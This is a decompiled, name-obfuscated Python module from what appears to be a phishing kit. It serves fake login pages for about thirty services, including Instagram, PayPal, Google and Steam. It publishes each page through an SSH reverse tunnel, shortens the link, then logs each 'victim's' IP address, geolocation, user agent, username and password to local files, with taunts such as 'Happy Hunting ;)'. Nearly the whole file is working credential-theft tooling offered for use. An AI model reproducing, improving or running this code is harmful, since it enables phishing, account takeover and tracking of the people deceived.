# Source Generated with Decompyle++
# File: template.pyc (Python 3.8)

from files.startup import *

def csite():
    O0OOO0OOO000OO000 = input(red + 'Website ' + yellow + '>' + green)
    if O0OOO0OOO000OO000 == '1':
        template('instagram')
    elif O0OOO0OOO000OO000 == '2':
        template('facebook')
    elif O0OOO0OOO000OO000 == '3':
        template('snapchat')
    elif O0OOO0OOO000OO000 == '4':
        template('twitter')
    elif O0OOO0OOO000OO000 == '5':
        template('github')
    elif O0OOO0OOO000OO000 == '6':
        template('google')
    elif O0OOO0OOO000OO000 == '7':
        template('spotify')
    elif O0OOO0OOO000OO000 == '8':
        template('netflix')
    elif O0OOO0OOO000OO000 == '9':
        template('paypal')
    elif O0OOO0OOO000OO000 == '10':
        template('origin')
    if O0OOO0OOO000OO000 == '11':
        template('steam')
    elif O0OOO0OOO000OO000 == '12':
        template('yahoo')
    elif O0OOO0OOO000OO000 == '13':
        template('linkedin')
    elif O0OOO0OOO000OO000 == '14':
        template('protonmail')
    elif O0OOO0OOO000OO000 == '15':
        template('wordpress')
    elif O0OOO0OOO000OO000 == '16':
        template('microsoft')
    elif O0OOO0OOO000OO000 == '17':
        template('instafollowers')
    elif O0OOO0OOO000OO000 == '18':
        template('pinterest')
    elif O0OOO0OOO000OO000 == '19':
        template('cryptocurrency')
    elif O0OOO0OOO000OO000 == '20':
        template('verizon')
    if O0OOO0OOO000OO000 == '21':
        template('dropbox')
    elif O0OOO0OOO000OO000 == '22':
        template('adobe')
    elif O0OOO0OOO000OO000 == '23':
        template('shopify')
    elif O0OOO0OOO000OO000 == '24':
        template('messenger')
    elif O0OOO0OOO000OO000 == '25':
        template('gitlab')
    elif O0OOO0OOO000OO000 == '26':
        template('twitch')
    elif O0OOO0OOO000OO000 == '27':
        template('myspace')
    elif O0OOO0OOO000OO000 == '28':
        template('badoo')
    elif O0OOO0OOO000OO000 == '29':
        template('vk')
    elif O0OOO0OOO000OO000 == '30':
        template('yandex')
    elif O0OOO0OOO000OO000 == '31':
        template('devianart')
    elif O0OOO0OOO000OO000 == '0':
        mm()
    else:
        print('wrong input!')
        csite()


def template(O0O00O00O0OO000O0):
    os.system('clear')
    OO0OO00O0O00OO000 = int(input('\x1b[92mPort: \x1b[93m'))
    os.system('cd templates/' + O0O00O00O0OO000O0 + '/;rm -rf .newvic .scammed ip.txt usernames.txt>/dev/null ;php -S 127.0.0.1:' + str(OO0OO00O0O00OO000) + ' 2> /dev/null >.php.log &')
    slow('Starting PHP Server on ' + red + 'http://127.0.0.1:' + str(OO0OO00O0O00OO000) + '\n', 0.01)
    os.popen('ssh  -o StrictHostKeyChecking=no -R 80:localhost:' + str(OO0OO00O0O00OO000) + ' d4rkgeek8@ssh.localhost.run 2> /dev/null > .log ')
    os.system('sleep 10')
    OO00OOO00O0OO0O0O = os.popen('cat .log|cut -d " " -f3').read()
    OO00000O0O0O000O0 = os.popen('cat .log|cut -d " " -f5').read()
    OOO00OO00OOOOO00O = os.popen('curl -s http://tinyurl.com/api-create.php\\?url=' + OO00000O0O0O000O0).read()
    print(red + 'Original link1:' + green + OO00OOO00O0OO0O0O + '\n\r')
    print(red + 'Original link2:' + green + OO00000O0O0O000O0 + '\n\r')
    print(red + 'Shorted link:' + green + OOO00OO00OOOOO00O + '\n')
    slow('\n\rWaiting for the Victim.....\r\nHappy Hunting ;)\r\n', 0.1)
    
    try:
        OOO0OOO0000O00OO0 = open('templates/' + O0O00O00O0OO000O0 + '/.newvic')
        print('\r\nNew Victim XD:\n')
        O0OO0000OO0O0OO0O = os.popen("grep -a 'IP:' templates/" + O0O00O00O0OO000O0 + '/ip.txt | cut -d " " -f2 | tr -d \'\\r\'').read()
        O0OO000O0O000OOO0 = os.popen('curl -s https://ipapi.co/' + O0OO0000OO0O0OO0O.replace('\n', '') + '/json').read()
        OO0OO00000OO00OOO = O0OO000O0O000OOO0.replace(':', ':\x1b[1;92m').replace('\n', '\n\x1b[1;91m').replace('"', '').replace('{', '').replace('}', '').replace('\n', '\n\r')
        OO00O0OO0OO0O0000 = os.popen("grep -a 'User-Agent:' templates/" + O0O00O00O0OO000O0 + '/ip.txt | cut -d \'"\' -f2 | tr -d \'\\r\'').read()
        slow(red + '\rIP:' + green + O0OO0000OO0O0OO0O + '\n', 0.05)
        slow(red + '\rUser-Agent:' + green + OO00O0OO0OO0O0000 + '\n\r', 0.05)
        slow(green + '\rFootPrinting the IP....\n\r', 0.1)
        slow('\r' + OO0OO00000OO00OOO + '\n\r', 0.025)
        OOOOOOOO0O0000O00 = open('savedIPs.txt', 'a+')
        OOOOOOOO0O0000O00.write('Scam:' + O0O00O00O0OO000O0 + '\n' + OO0OO00000OO00OOO)
        slow(green + '\n\rSaved IPs in' + yellow + ' savedIPs.txt\n\r', 0.05)
        
        try:
            OOO0OOO0000O00OO0 = open('templates/' + O0O00O00O0OO000O0 + '/.scammed')
            O0OOOOOO000OO0OOO = os.popen("grep -o 'Account:.*' templates/" + O0O00O00O0OO000O0 + '/usernames.txt | cut -d " " -f2').read()
            O0OOO0OOOOO0O0OOO = os.popen("grep -o 'Pass:.*' templates/" + O0O00O00O0OO000O0 + '/usernames.txt | cut -d ":" -f2').read()
            slow('\nLogin Data is :\n\r', 0.05)
            slow('\n\r' + red + 'Account: ' + green + O0OOOOOO000OO0OOO, 0.05)
            slow('\n\r' + red + 'Pass:' + green + O0OOO0OOOOO0O0OOO, 0.05)
            OOOOOOOO0O0000O00 = open('savedAccounts.txt', 'a+')
            OOOOOOOO0O0000O00.write('Scam:' + O0O00O00O0OO000O0 + '\nAccount: ' + O0OOOOOO000OO0OOO + '\nPassword:' + O0OOO0OOOOO0O0OOO)
            slow(green + '\n\rSaved Data in' + yellow + ' savedAccounts.txt\n\r', 0.05)
        except IOError:
            slow('Waiting For Login Data ...\r', 0.1)
        

    except IOError:
        slow('Waiting ...\r', 0.1)
    
    return None


